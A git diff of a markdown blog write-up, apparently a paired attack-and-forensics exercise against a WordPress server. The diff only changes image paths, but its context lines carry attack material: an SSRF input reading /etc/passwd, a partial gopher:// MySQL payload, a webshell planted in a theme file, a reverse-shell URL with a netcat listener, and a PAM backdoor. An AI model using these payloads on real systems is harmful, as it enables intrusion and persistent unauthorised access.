@@ -151,7 +151,7 @@ $ sudo usermod -aG docker odie
 Now that everything is installed, he decided to customize his website with a more rock'n'roll theme. 
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/env_1.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/env_1.png)
 
 
 After that, Odie go back to his business. He got some work to do for his school. Hurry! It's the last year, he shouldn't miss it! 
@@ -185,7 +185,7 @@ Haax did a great article about "vulnerabilities" or dangerous features on WordPr
 At least, the WordPress is up to date. `Wappalyzer` is a Firefox plugins which display versions of solutions used in the visited website.
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_1.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_1.png)
 
 
 ### Nmap
@@ -225,7 +225,7 @@ host $ xsltproc nmap.xml > nmap.html
 This tool will convert the XML file to an HTML file similar to:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_2.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_2.png)
 
 
 ### Bruteforce?
@@ -234,7 +234,7 @@ We could try to brute-force the SSH with __eddiethehead__ or __oddie__ as userna
 Yes I know, it's not quiet, but well, I'm sure Odie won't see his logs.... At least for the moment.
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_3.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_3.png)
 
 
 We use 40 threads because, well, I have already generated logs, then let's continue in that way. I will use the "medium" wordlist provided with DirBuster, which never really disappointed me. 
@@ -244,13 +244,13 @@ And finally, we will only look for PHP and text files in the root folder, withou
 After only 8500 requests, a file got my attention: `test.php`. It is not a default WordPress file:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_4.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_4.png)
 
 
 Let's take a look at it:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_5.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_5.png)
 
 
 ## Exploitation
@@ -258,13 +258,13 @@ Let's take a look at it:
 A file checker, let's see what happens if I query for `maki.bzh` (totally random choice obviously :D).
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_6.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_6.png)
 
 
 We can only test local files. Let's try with the `index.php` file:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_7.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_7.png)
 
 
 Hmmm... It includes the webpage, we might think there is a file inclusion somewhere!
@@ -274,7 +274,7 @@ Hmmm... It includes the webpage, we might think there is a file inclusion somewh
 Indeed, we can think of a Local File Inclusion, a Remote Command Execution or Server Side Request Forgery... But thanks to the output verbosity, we assume this script is using `curl`:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_8.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_8.png)
 
 
 Let's try to change the protocol used, something like `file://` instead of `http://`. If we don't miss the localhost condition, it should work:
@@ -282,7 +282,7 @@ Let's try to change the protocol used, something like `file://` instead of `http
 > file://localhost/etc/passwd
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_9.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_9.png)
 
 
 This application allows us to include arbitrary file, great. By the way, there is a user called __odie__ on the system. I will display the content of `test.php`, just to be clear about the vulnerability:
@@ -501,7 +501,7 @@ To execute SQL commands, I will need to look at the query in Wireshark and under
 The mentioned article shows us how to simulate the MySQL request in a local environment, retrieve data transmitted and replay them. This means that MariaDB has no specific protection against regame or authenticity.
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_10.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_10.gif)
 
 
 Displayed bytes at the end of the above GIF will be used as payload to get the username and hashed password from the WordPress database. With a little python script, stolen to our asian friends, I will be able to generate the complete payload:
@@ -532,7 +532,7 @@ gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%
 By filling the "URL" input of `test.php` with our ugly payload, there is a nice return in front of our eyes: 
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_11.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_11.png)
 
 
 
@@ -593,7 +593,7 @@ It's time for me to log on the WordPress administration panel:
 |eddiethehead|eddiethehead123|
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_12.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_12.png)
 
 
 It works like a charm! Now it's time to execute commands directly on the Linux host. To do that, I just have to edit or upload a PHP page. Nowadays, it's possible to edit the current CMS theme through the web view.
@@ -603,7 +603,7 @@ It works like a charm! Now it's time to execute commands directly on the Linux h
 On the right panel, we can see the "inc" folder, inside it, there are some PHP files such as `customizer.php`. I will inject arbitrary PHP code in this page:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_13.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_13.png)
 
 
 This little PHP line will runs the data sent through the "x" GET parameter. Here is an example:
@@ -640,7 +640,7 @@ http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=python -
 And now, just listen on your 3615 TCP port using `netcat`:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_14.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_14.gif)
 
 
 It's possible to have a fully interactive shell from this shitty one, using Python and other trick: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
@@ -650,7 +650,7 @@ I ever presented these tricks in __Santhacklaus__ CTF writeups: https://maki.bzh
 But I love GIFs, so here is again :D
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_15.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_15.gif)
 
 
 ### From www-data to odie
@@ -766,7 +766,7 @@ ImportError: No module named requests
 ```
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_16.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_16.gif)
 
 
 The "-p" argument of bash allow conserving rights. Otherwise, we would have had a bash as __www-data__, not really interesting in our case.
@@ -864,7 +864,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_17.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_17.gif)
 
 
 ## Post exploitation
@@ -901,7 +901,7 @@ The first `mv` is used to do a backup of the existing libary, in case of failure
 Ok, the backdoor is installed, let's test:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/red_18.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_18.gif)
 
 
 In two password prompt above, the password was: `PlopPlop1337`. The system is fully compromised, with perennial access to the system!
@@ -1037,7 +1037,7 @@ tcp   ESTAB      0      0      192.168.122.216:ssh                  192.168.122.
 ```
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/blue_1.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_1.gif)
 
 
 Panicked by what he sees, he decides to make a memory dump of his VPS and put on his cyber digital firefighter cap 2.0.
@@ -1316,7 +1316,7 @@ We have barely made this discovery that Odie wants to try to log on with these c
 He realizes with amazement that it works! It seems that a backdoor has been installed! Questions are: where it is and how did it come here?
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/blue_2.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_2.gif)
 
 
 After a few research on the internet, I fell on PAM mechanism and a great GitHub for backdoor creation: https://github.com/zephrax/linux-pam-backdoor
@@ -1394,7 +1394,7 @@ $ cat access.log.swp | grep 158 | ccze -A | less -I
 Pro tip: when you have to read large Apache2 logs, and you don't have super cyber SIEM 4.0, you got `ccze`. It will colorize the output and will gives this result:
 
  
-![](/img/articles/realgsmoveinsilencelikelasagna/blue_3.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_3.png)
 
 
 Odie sees a beautiful little _User-Agent_: `DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)`
@@ -1612,7 +1612,7 @@ function getUrlContent($url){
 So this page makes a poor curl on a page located in the localhost (127.0.0.1). Odie told me it was for a course project or something, whatever. He probably got fucked because of this project
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/blue_5.gif)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_5.gif)
 
 
 We have found several interesting websites:
@@ -1717,7 +1717,7 @@ Odie followed the URL found in the log:
 > http://192.168.122.216/wp-admin/theme-editor.php?file=inc%2Fcustomizer.php&theme=rock-band
 
  
-![](/img/articles/realgsmoveinsilencelikelasagna/blue_4.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/blue_4.png)
 
 
 At the very first view, nothing really awful over there. But Monique edited a PHP web page: `customizer.php`. We can hypothesize that the evil hacker injects arbitrary PHP code in this page in order to get access on the Debian server. 
@@ -2092,7 +2092,7 @@ Finally, the laziness of using sudo every time he needs to use docker will have 
 According to our analysis, here is the attacker scenario:
 
 
-![](/img/articles/realgsmoveinsilencelikelasagna/scenario_1.png)
+![](/lib/images/articles/realgsmoveinsilencelikelasagna/scenario_1.png)
 
 
 ## Action plan
